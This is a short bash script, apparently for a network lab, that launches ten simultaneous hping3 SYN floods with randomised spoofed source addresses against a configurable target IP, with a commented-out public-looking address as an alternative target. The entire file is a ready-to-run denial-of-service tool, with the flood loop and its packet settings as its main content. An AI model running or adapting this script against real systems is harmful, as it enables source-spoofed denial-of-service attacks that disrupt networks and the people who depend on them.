#!/bin/bash

# This script generates SYN floods using hping3

# intensity varies based on the number of attacks running at once
# more attack commands means more packets sent
# target IP (10.10.1.1 is a 10 Gbps link to kelewan)
# 10.40.1.1 is 40 Gbps link
#target=169.237.10.84
target=10.40.1.1

# TCP window size
window=1MB

# hping3 SYN flood settings
pkt_count=1000000
data_size=64
hping_window=64
hping_port=21
attack_duration=10

# run iperf client as daemon

# number of hping floods
hping_count=10
# time between hping floods, 0 to start at same time
hping_time=0
for ((i=1;i<=hping_count;i++)); do
            sleep $hping_time
            timeout $attack_duration hping3 -c $pkt_count -d $data_size -S -w $hping_window -p $hping_port --flood --rand-source $target &
            echo "sending SYN flood..."
    done
